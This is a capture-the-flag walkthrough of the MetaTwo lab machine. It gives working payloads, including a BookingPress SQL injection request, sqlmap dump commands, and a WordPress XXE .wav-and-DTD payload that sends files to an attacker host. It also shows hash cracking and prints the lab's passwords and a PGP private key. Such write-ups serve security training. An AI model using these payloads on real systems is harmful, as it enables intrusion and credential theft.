# MetaTwo HTB machine

**A machine with a web service that books events, which is vulnerable to unauthenticated SQL Injection.**

First of all, we should add the ip of the machine into the hosts folder. This is sometimes needed for the DNS resolution.

- Go to etc/hosts and add the line "10.10.11.186 metapress.htb". Save the file and open your vpn document with "openvpn name_of_vpn_document" from the terminal.

- After exploring the web page, we can see that we are able to book events through the events section in the search section. We should find an entry point for our initial access. Examinating the source code of the web page, under events section, we find out that the plugin used for booking events is "BookingPress 1.0.10". After searching this plugin, we find out that all BookingPress versions before 1.0.11 are vulnerable to "Unauthenticated SQL Injection".

This article explains the vulnerability and the exploit: 
https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357

- First, we must locate the "wponce" value. The term "wpnonce" stands for "WordPress nonce" which is a security feature in WordPress that helps to prevent unauthorized access to certain actions or data. Nonces are random generated strings that are unique to a specific action and expire after a set period of time. They are used in WordPress to verify that a user or application has the correct permissions to perform a certain action, such as submitting a form or making a request to the server.

After examinating the source code of the events section, we find the wponce value "_wpnonce:'35b4fc273d'".

Based on the article, we must construct the following command:

```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=4e24365bce&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

Executing the command, will generate the following logs with the data requested.

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 21 Mar 2023 01:47:40 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

- Since, we can confirm that the website is vulnerable to unauthenticated SQLI, we can use sqlmap to view the database.

Based on the article, we need to declare the following data wildcard in the sqlmap. (Substitute with your wpnonce value)

```
action=bookingpress_front_get_category_services&_wpnonce=35b4fc273d&category_id=33&total_service=1
```

The final sqlmap command is the following:

```
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data="action=bookingpress_front_get_category_services&_wpnonce=35b4fc273d&category_id=33&total_service=1" -p "total_service" --dbs
```

Executing the command, will produce many logs, but the most important part is the following:

```
available databases [2]:
[*] blog
[*] information_schema
```

The whole database is divided into 2 databases. We will construct a new sqlmap command to fetch the "blog" database and print the "wp_users" data to see whether we can find the credentials of the users. 

```
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data="action=bookingpress_front_get_category_services&_wpnonce=35b4fc273d&category_id=33&total_service=1" -p "total_service" -D blog -T wp_users --dump
```

Executing the command, we will get the following logs:

```
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
```

Out of them, we can extract the hashed passwords and usernames of the users. Let's see if we can crack any of these hashes. 

- We can copy the hashes "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV." and "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70" and paste them in a text file called "hashes.txt". We will also need the "rockyou.txt" file that contains the most common passwords and will be used as a wordlist. You can find it online and import it in the same directory or find it from the linux shared directory. To perform the cracking of the hashes, we will use the "john" command, aka "John the Ripper", which is a password cracker tool. You can use the following command: 

```
john hashes --wordlist=rockyou.txt
```

Then run the following command to see the cracked password:

```
john hashes --show
```

The password is: partylikearockstar

We can do the similar password cracking method, using the "hashcat" command tool, similarly:

```
hashcat -m 400 -a 0 hashes rockyou.txt
```
```
hashcat -m 400 -a 0 hashes rockyou.txt --show
```

- So the username is "manager" and the password is "partylikearockstar". To login we need to find the wordpress admin page from the website with ip 10.10.11.186. Go to http://metapress.htb/admin and enter the credentials. Then, we should be able to see the MetaPress wordpress dashboard. But, how are we going to gain access to the machine of the website, from the wordpress platform?

After doing a wpscan on the website, we find out that the wordpress version is insecure. To perform a wpscan on the website, we can execute the following command:

```
wpscan --url http://metapress.htb
```

Then, in the logs, we will see the WordPress version, and the fact that it is insecure.

```
WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
```

The following article mentions the vulnerability:

https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5

The following article provides the PoC(Proof of Concept) of the attack:

https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/

Checking out the vulnerability, we see "WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8". We must generate a malicious .wav file and upload it to the wordpress media library. With the following command, we generate the malicious audio file:

```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.16.17:4444/xxe_attack.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

Make sure to adjust the command to the ip address and port of your device. During the parsing of this malicious .wav file, the WordPress content management system (CMS) will execute the xxe_attack.dtd file that contains XML code. We can construct it with the following code:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.17:4444/?p=%file;'>" >
```

By changing the file path "/etc/passwd" in the xxe_attack.dtd, and then re-uploading the .wav file, we are able to get base-64 encrypted content of any file in the machine.

To execute the attack, construct the files above, and start a php session in the same directory with the files. To start the session, execute the following code:

```
php -S 0.0.0.0:4444
```

Then, upload the "payload.wav" file, on the media library of the wordpress CMS. In the php session, we get the following base64 encoded strings, from the logs:

```
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=
```

If we base64-decode the string, we are able to see it's content.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

We need now to find the configuration file of the wordpress CMS. We do not know the path of it, but we can search about it through the nginx configuration file. Update the .dtd file with the following command:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.17:4444/?p=%file;'>" >
```

Uploading the .wav file and decoding the data, we receive this script:

```
server {

        listen 80;
        listen [::]:80;

        root /var/www/metapress.htb/blog;

        index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

        location / {
                try_files $uri $uri/ /index.php?$args;
        }
    
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
        }

        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
                expires max;
                log_not_found off;
        }

}
```

So, the wp-config.php is under the /var/www/metapress.htb/blog/ directory. Construct the new .dtd file and do the same process:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.17:4444/?p=%file;'>" >
```

The new base64 decoded data, is the following php script:

```
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Through this script, we can extract the ftp user credentials:

```
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
```

We can try ftp, with the following command:

```
ftp 10.10.11.186
```

After providing the credentials, we are in. Do "ls" and "cd" to list the contents of the database and to change your directory, respectively. After, messing around with the database, we can find a file named "send_email.php". Using "get" command, we can download the file and see it's content. Through examinating the file, we can find the following part:

```
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys"; 
```

So, we have the credentials for the user "jnelson", and that means that we can now ssh to the machine.

```
ssh jnelson@metapress.htb
```

After providing the password, we can view the "user.txt" flag.

- Now, we need to find a way to do privilege escalation to the machine, to get the root flag. Executing "ls -la" in the jnelson user directory, we notice a unique directory called ".passpie". 

Passpie is a command line tool to manage passwords from the terminal with a colorful and configurable interface. Use a master passphrase to decrypt login credentials, copy passwords to clipboard, syncronize with a git repository, check the state of your passwords, and more. The contents of the folder, contain a "root password" in "PGP" format. It is encrypted using a key. We can find a file named ".keys". Let's try to crack the PGP key to decrypt the root password.

We can copy the following key and paste it in a file named "key" in our system.

```
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

First, we need to convert the key file to "john" format.

```
gpg2john key > gpg.john
```

Then, just crack it with the following command:

```
john -w=rockyou.txt gpg.john 
```
View the password:

```
john gpg.john --show
```

After cracking the password, we get the value "blink182". Go under the jnelson directory and execute "touch pass" to create a file and then "passpie export pass" to decrypt the contents using the password we cracked. We get the following log:

```
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

Then, try to execute "su root" and enter the password "p7qfAZt4_A1xo_0x" that we got earlier. 

Congrats! Now we are "root" user and we can go to the "root" folder to get the "root.txt" flag.

